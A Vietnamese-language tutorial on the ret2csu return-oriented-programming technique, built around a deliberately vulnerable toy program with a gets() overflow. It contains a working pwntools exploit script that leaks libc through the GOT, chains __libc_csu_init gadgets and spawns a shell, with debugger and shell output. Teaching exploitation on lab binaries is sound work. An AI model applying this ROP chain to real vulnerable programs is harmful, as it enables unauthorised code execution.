# Ret2csu
## Introduction
kỹ thuật ret2csu này liên quan đến việc tận dụng 1 gadgets luôn có sẵn trong các file binary là `__libc_csu_init` để bù vào những chỗ  trống cho các gadgets thường dùng trong ROP không có trong file binary. Ví dụ, nếu ta cần thực hiện `execve` syscall, chúng ta cần truyền vào các thanh ghi với các giá trị sau:
-   rdi = địa chỉ trỏ vào chuỗi `/bin/sh`
-   rdx = 0
-   rsi = 0

trong lúc này chúng ta đang tìm các gadget có trong binary, ta sẽ không thể tìm thấy 1 gadget như `pop rdx;ret`. Vì vậy, ret2csu được sinh ra nhờ tận dụng các gadget có trong `_libc_csu_init`, để craft thành 1 payload hoàn chỉnh.
## __libc_csu_init and __libc_csu_fini - Program level ctor/dtor handlers
Mục đích của `__libc_csu_init` là dùng để initialize function và variables để binary có thể dùng. từ source của glibc:
```c
int __libc_csu_init(int argc, char **argv, char **envp)
{
    /*
     * Call all the __attribute__((constructor)) functions.
     * These symbols are generated by the linker.
     */
    size_t num_init = __init_array_end - __init_array_start;
    for (size_t i = 0; i < num_init; i++) {
        __init_array_start[i](argc, argv, envp);
    }
}
```
Tóm lại, thì hàm này dùng để tính toán sự khác biệt giữa `__init_aray` lúc bắt đầu và kết thúc - cái mà bao gồm functions, constructors, destructors, objects... 

Nói đơn giản thì constructor sẽ thực hiện trước hàm `main()` và deconstructor sẽ thực hiện khi kết thúc hàm. Đọc giả có thể đọc sâu hơn về các hàm này ở references bên dưới.
### references 
> http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html

> https://phoxis.org/2011/04/27/c-language-constructors-and-destructors-with-gcc/

> https://oneraynyday.github.io/dev/2020/05/03/Analyzing-The-Simplest-C++-Program/

> http://bottomupcs.sourceforge.net/csbu/x3564.htm

## Practice

source code:
```c
#include<stdio.h>
#include<stdlib.h>
int main(){
    char buf[30];
    putss("Welcome to Ret2csu!!!");
    gets(buf);
    return 0;
}
```
```asm
0000000000400537 <main>:
  400537:	55                   	push   rbp
  400538:	48 89 e5             	mov    rbp,rsp
  40053b:	48 83 ec 20          	sub    rsp,0x20
  40053f:	48 8d 3d ae 00 00 00 	lea    rdi,[rip+0xae]        # 4005f4 <_IO_stdin_used+0x4>
  400546:	e8 e5 fe ff ff       	call   400430 <puts@plt>
  40054b:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  40054f:	48 89 c7             	mov    rdi,rax
  400552:	b8 00 00 00 00       	mov    eax,0x0
  400557:	e8 e4 fe ff ff       	call   400440 <gets@plt>
  40055c:	b8 00 00 00 00       	mov    eax,0x0
  400561:	c9                   	leave  
  400562:	c3                   	ret    
  400563:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  40056a:	00 00 00 
  40056d:	0f 1f 00             	nop    DWORD PTR [rax]

0000000000400570 <__libc_csu_init>:
  400570:	41 57                	push   r15
  400572:	41 56                	push   r14
  400574:	49 89 d7             	mov    r15,rdx
  400577:	41 55                	push   r13
  400579:	41 54                	push   r12
  40057b:	4c 8d 25 8e 08 20 00 	lea    r12,[rip+0x20088e]        # 600e10 <__frame_dummy_init_array_entry>
  400582:	55                   	push   rbp
  400583:	48 8d 2d 8e 08 20 00 	lea    rbp,[rip+0x20088e]        # 600e18 <__init_array_end>
  40058a:	53                   	push   rbx
  40058b:	41 89 fd             	mov    r13d,edi
  40058e:	49 89 f6             	mov    r14,rsi
  400591:	4c 29 e5             	sub    rbp,r12
  400594:	48 83 ec 08          	sub    rsp,0x8
  400598:	48 c1 fd 03          	sar    rbp,0x3
  40059c:	e8 5f fe ff ff       	call   400400 <_init>
  4005a1:	48 85 ed             	test   rbp,rbp
  4005a4:	74 20                	je     4005c6 <__libc_csu_init+0x56>
  4005a6:	31 db                	xor    ebx,ebx
  4005a8:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
  4005af:	00 
  4005b0:	4c 89 fa             	mov    rdx,r15
  4005b3:	4c 89 f6             	mov    rsi,r14
  4005b6:	44 89 ef             	mov    edi,r13d
  4005b9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
  4005bd:	48 83 c3 01          	add    rbx,0x1
  4005c1:	48 39 dd             	cmp    rbp,rbx
  4005c4:	75 ea                	jne    4005b0 <__libc_csu_init+0x40>
  4005c6:	48 83 c4 08          	add    rsp,0x8
  4005ca:	5b                   	pop    rbx
  4005cb:	5d                   	pop    rbp
  4005cc:	41 5c                	pop    r12
  4005ce:	41 5d                	pop    r13
  4005d0:	41 5e                	pop    r14
  4005d2:	41 5f                	pop    r15
  4005d4:	c3                   	ret    
  4005d5:	90                   	nop
  4005d6:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  4005dd:	00 00 00 
```
### finding offset:
```asm
pwndbg> r < <(python -c "print 'a'*0x28 + 'bbbbbbbb'")
Starting program: /home/tinnt/research/ret2csu/main < <(python -c "print 'a'*0x28 + 'bbbbbbbb'")
Welcome to Ret2csu!!!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400562 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7ffff7dcda00 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RDX  0x7ffff7dcf8d0 (_IO_stdfile_0_lock) ◂— 0x0
 RDI  0x7fffffffdf61 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb'
 RSI  0x602671 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\n'
 R8   0x6026a1 ◂— 0x0
 R9   0x0
 R10  0x602010 ◂— 0x0
 R11  0x246
 R12  0x400450 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffe060 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x7fffffffdf88 ◂— 'bbbbbbbb'
 RIP  0x400562 (main+43) ◂— ret    
───────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
 ► 0x400562 <main+43>    ret    <0x6262626262626262>










───────────────────────────────────────────[ STACK ]────────────────────────────────────────────
00:0000│ rsp  0x7fffffffdf88 ◂— 'bbbbbbbb'
01:0008│      0x7fffffffdf90 ◂— 0x0
02:0010│      0x7fffffffdf98 —▸ 0x7fffffffe068 —▸ 0x7fffffffe39a ◂— '/home/tinnt/research/ret2csu/main'
03:0018│      0x7fffffffdfa0 ◂— 0x100008000
04:0020│      0x7fffffffdfa8 —▸ 0x400537 (main) ◂— push   rbp
05:0028│      0x7fffffffdfb0 ◂— 0x0
06:0030│      0x7fffffffdfb8 ◂— 0x195a7b43315f6195
07:0038│      0x7fffffffdfc0 —▸ 0x400450 (_start) ◂— xor    ebp, ebp
─────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────
 ► f 0           400562 main+43
   f 1 6262626262626262
   f 2                0
────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```
### Lưu /bin/sh vào `.bss` segment
Vì chúng ta cần `execve("/bin/sh",0,0)`, nhưng mà vì chúng ta chưa có trong memory chứa địa chỉ của chuỗi này (thực chất là có, load được từ libc nhưng vì đây là kĩ thuật khác nên sẽ không dùng chuỗi được load sẵn từ libc), nên việc của ta làm lúc này là chọn 1 vùng nhớ writable (thường là .bss, .data) và write chuỗi `/bin/sh\x00` vào đó.

```py
from pwn import *

io = process('./main')
elf = ELF('./main')
libc = elf.libc
payload = 'a'*0x28
# write /bin/sh to .bss, gets(buf)
payload += p64(0x00000000004005d3)# pop rdi ; ret
# 0x601038, hex(elf.bss())
payload += p64(elf.bss()) # .bss
payload += p64(elf.plt['gets']) 

io.sendline(payload)

io.interactive()
```

chúng ta sẽ attach gdb vào trước khi send payload để debug:
`gdb.attach(io)`

```asm
pwndbg: loaded 191 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./main...(no debugging symbols found)...done.
Attaching to program: /home/tinnt/research/ret2csu/main, process 42589
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so...done.
done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/ld-2.27.so...done.
done.
0x00007f6c1be02151 in __GI___libc_read (fd=0, buf=0x136b670, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:27
27	../sysdeps/unix/sysv/linux/read.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x7f6c1c0dda00 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RCX  0x7f6c1be02151 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0x0
 RSI  0x136b670 ◂— 0x0
 R8   0x77
 R9   0x0
 R10  0x136b010 ◂— 0x0
 R11  0x246
 R12  0x7f6c1c0d9760 (_IO_helper_jumps) ◂— 0x0
 R13  0x7f6c1c0da2a0 (_IO_file_jumps) ◂— 0x0
 R14  0x0
 R15  0x0
 RBP  0xd68
 RSP  0x7ffc7b387108 —▸ 0x7f6c1bd7f218 (_IO_file_underflow+296) ◂— test   rax, rax
 RIP  0x7f6c1be02151 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7f6c1be02151 <read+17>     cmp    rax, -0x1000
   0x7f6c1be02157 <read+23>     ja     read+112 <read+112>
    ↓
   0x7f6c1be021b0 <read+112>    mov    rdx, qword ptr [rip + 0x2dacb1]
   0x7f6c1be021b7 <read+119>    neg    eax
   0x7f6c1be021b9 <read+121>    mov    dword ptr fs:[rdx], eax
   0x7f6c1be021bc <read+124>    mov    rax, -1
   0x7f6c1be021c3 <read+131>    ret    
 
   0x7f6c1be021c4 <read+132>    mov    rdx, qword ptr [rip + 0x2dac9d]
   0x7f6c1be021cb <read+139>    neg    eax
   0x7f6c1be021cd <read+141>    mov    dword ptr fs:[rdx], eax
   0x7f6c1be021d0 <read+144>    mov    rax, -1
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7ffc7b387108 —▸ 0x7f6c1bd7f218 (_IO_file_underflow+296) ◂— test   rax, rax
01:0008│      0x7ffc7b387110 —▸ 0x7f6c1c0dda00 (_IO_2_1_stdin_) ◂— 0xfbad2088
02:0010│      0x7ffc7b387118 —▸ 0x7f6c1c0da2a0 (_IO_file_jumps) ◂— 0x0
03:0018│      0x7ffc7b387120 —▸ 0x400450 (_start) ◂— xor    ebp, ebp
04:0020│      0x7ffc7b387128 —▸ 0x7ffc7b387280 ◂— 0x1
05:0028│      0x7ffc7b387130 ◂— 0x0
06:0030│      0x7ffc7b387138 —▸ 0x7f6c1bd804c2 (_IO_default_uflow+50) ◂— cmp    eax, -1
07:0038│      0x7ffc7b387140 —▸ 0x4005f4 ◂— push   rdi /* 'Welcome to Ret2csu!!!' */
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0     7f6c1be02151 read+17
   f 1     7f6c1bd7f218 _IO_file_underflow+296
   f 2     7f6c1bd804c2 _IO_default_uflow+50
   f 3     7f6c1bd722dd gets+333
   f 4           40055c main+37
   f 5     7f6c1bd13bf7 __libc_start_main+231
────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
```

gửi `/bin/sh` ở interactive bash:
```bash
[*] Switching to interactive mode
$ /bin/sh
```
kiểm tra xem /bin/sh có write vào .bss hay không:
```py
pwndbg> x/s 0x601038
0x601038 <completed.7698>:      "/bin/sh"
```

### Ret2csu
Bây giờ chúng ta sẽ đi vào phần chính thức của chương trình bằng cách dùng các gadget của `__libc_csu_init`:
```asm
4005b0:	4c 89 fa             	mov    rdx,r15
4005b3:	4c 89 f6             	mov    rsi,r14
4005b6:	44 89 ef             	mov    edi,r13d
4005b9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
4005bd:	48 83 c3 01          	add    rbx,0x1
4005c1:	48 39 dd             	cmp    rbp,rbx
4005c4:	75 ea                	jne    4005b0 <__libc_csu_init+0x40>
4005c6:	48 83 c4 08          	add    rsp,0x8
4005ca:	5b                   	pop    rbx
4005cb:	5d                   	pop    rbp
4005cc:	41 5c                	pop    r12
4005ce:	41 5d                	pop    r13
4005d0:	41 5e                	pop    r14
4005d2:	41 5f                	pop    r15
4005d4:	c3                   	ret     
```
Ta có `rdx = r15`, `rsi = r14`, `edi = r13d` (d trong r13d là dword và edi lúc này ta có thể hiểu là rdi luôn vì khi kết ). Điều này có nghĩa là ta sẽ setup các register này theo thứ tự lần lượt là các giá trị `/bin/sh`, `0`,`0`. Nhưng có 1 vấn đề sau khi thực hiện các lệnh `mov` này:
```asm
4005b9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
```
Instruction này sẽ gọi 1 hàm con, lúc này chúng ta phải từ bỏ 1 vài function có trong binary và không tham chiếu tới địa chỉ không hợp lệ. Để làm được việc này, chúng ta sẽ dùng địa chỉ từ Dynamic section của ELF mà không làm thay đổi các content của thanh ghi ta setup.

Yêu cầu là chúng ta cần 1 trong 2 `_init` hoặc `_fini` để giữ được các trạng thái đó:
```asm
pwndbg> x/5gx &_DYNAMIC 
0x600e20:	0x0000000000000001	0x0000000000000001
0x600e30:	0x000000000000000c	0x0000000000400400
0x600e40:	0x000000000000000d
pwndbg> disassemble 0x0000000000400400
Dump of assembler code for function _init:
   0x0000000000400400 <+0>:	sub    rsp,0x8
   0x0000000000400404 <+4>:	mov    rax,QWORD PTR [rip+0x200bed]        # 0x600ff8
   0x000000000040040b <+11>:	test   rax,rax
   0x000000000040040e <+14>:	je     0x400412 <_init+18>
   0x0000000000400410 <+16>:	call   rax
   0x0000000000400412 <+18>:	add    rsp,0x8
   0x0000000000400416 <+22>:	ret    
End of assembler dump.
pwndbg> 
```
```asm
4005bd:	48 83 c3 01          	add    rbx,0x1
4005c1:	48 39 dd             	cmp    rbp,rbx
4005c4:	75 ea                	jne    4005b0 <__libc_csu_init+0x40>
4005c6:	48 83 c4 08          	add    rsp,0x8
```
Tăng giá trị rbx lên 1, so sánh giá trị của rbp và rbx và gặp 1 conditional jump, nếu giá trị này không bằng nhau, nó sẽ nhảy vào instruction lưu ở `<__libc_csu_init + 0x40>`
, cuối cùng là tăng giá trị của rsp lên 0x8.


#### Building up the ROP chain

Bây giờ chúng ta sẽ vào phần chính của bài viết. Như đã đề cập thì chúng ta sẽ dùng các gadgets của `__libc_csu_init` để lấy được root của chương trình. Sau đây là cách xây dựng lên ROP chain của kỹ thuật này:
- write `/bin/sh\x00` vào writable memory.
- leak địa chỉ GOT.
- Ret2csu!!!
Trước tiên chúng ta thực hiện 2 bước đầu với payload như sau:
```py
from pwn import *

io = process('./main')
elf = ELF('./main')
libc = elf.libc

payload = 'a'*0x28
# write /bin/sh to .bss, gets(buf)
payload += p64(0x00000000004005d3)# pop rdi ; ret
payload += p64(elf.bss()) # .bss
payload += p64(elf.plt['gets']) 
# leak GOT
payload += p64(0x00000000004005d3)# pop rdi; ret
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main']) # back to main again
io.sendlineafter('Welcome to Ret2csu!!!\n',payload)
# gdb.attach(io)
io.sendline('/bin/sh\x00')

leak = u64(io.recvline().strip().ljust(8,'\x00'))
libc.address = leak - libc.sym['puts']

log.info('libc: ' + hex(libc.address))

io.interactive()
```
```bash
$ python script.py 
[+] Starting local process './main': pid 43016
[*] '/home/tinnt/research/ret2csu/main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] u'/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc: 0x7ff0cc4c7000
[*] Switching to interactive mode

Welcome to Ret2csu!!!
$  
```

#### Ret2csu

Đến bước này chúng ta cần phải tính toán rất là chi li cho ROP chain của mình.

Khởi tạo các giá trị cho ret2csu:
```py
payload = 'a'*0x28
payload += p64(0x4005ca) # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += p64(0) # rbx
payload += p64(0x1) # rbp
# address of $_DYNAMIC ELF
payload += p64(0x600e38) # r12
payload += p64(elf.bss()) # r13
payload += p64(0)*2 # r14, r15
```
Đọc giả hãy xem lại đoạn code này, vì chúng ta sẽ dùng nó kế tiếp:
```asm
4005b0:	4c 89 fa             	mov    rdx,r15
4005b3:	4c 89 f6             	mov    rsi,r14
4005b6:	44 89 ef             	mov    edi,r13d
4005b9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
4005bd:	48 83 c3 01          	add    rbx,0x1
4005c1:	48 39 dd             	cmp    rbp,rbx
4005c4:	75 ea                	jne    4005b0 <__libc_csu_init+0x40>
4005c6:	48 83 c4 08          	add    rsp,0x8
```

`r12 = 0x600e38` (r12 trỏ vào địa chỉ `_init`), và chúng ta có `rbx = 0`, điều đó có nghĩa là `[r12 + rbx * 8] = [0x600e38 + 0*8] = [0x600e38]`. Lúc này khi chương trình call giá trị này, thì `rdi` của chúng ta lúc này đã trỏ vào `/bin/sh\x00`. Kế đến `rbx = 1`, sau đó `cmp rbp, rbx`, đọc giả hãy nhớ payload trước đó chúng ta đã cung cấp cho `rbp = 0x1` nên lúc này cả 2 thanh ghi đều bằng nhau, như vậy rop của chúng ta sẽ skip dòng `jne`. Cuối cùng là `add rsp, 0x8`, ở đoạn này chúng ta chỉ cần padding vào các giá trị này `0x0` rồi sau đó gọi `execve` là có thể lấy được shell
  
```py
payload += p64(0x4005b0)
payload += p64(0x00) # add rsp,0x8 padding
payload += p64(0x00) # rbx
payload += p64(0x00) # rbp
payload += p64(0x00) # r12
payload += p64(0x00) # r13
payload += p64(0x00) # r14
payload += p64(0x00) # r15
payload += p64(libc.symbols['execve'])
# gdb.attach(io)
io.sendlineafter('Welcome to Ret2csu!!!\n',payload)

io.interactive()
```
```bash
$ python script.py 
[+] Starting local process './main': pid 43271
[*] '/home/tinnt/research/ret2csu/main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] u'/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc: 0x7f7711fe5000
[*] Switching to interactive mode
$ id
uid=1000(tinnt) gid=1000(tinnt) groups=1000(tinnt),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
$ 
```
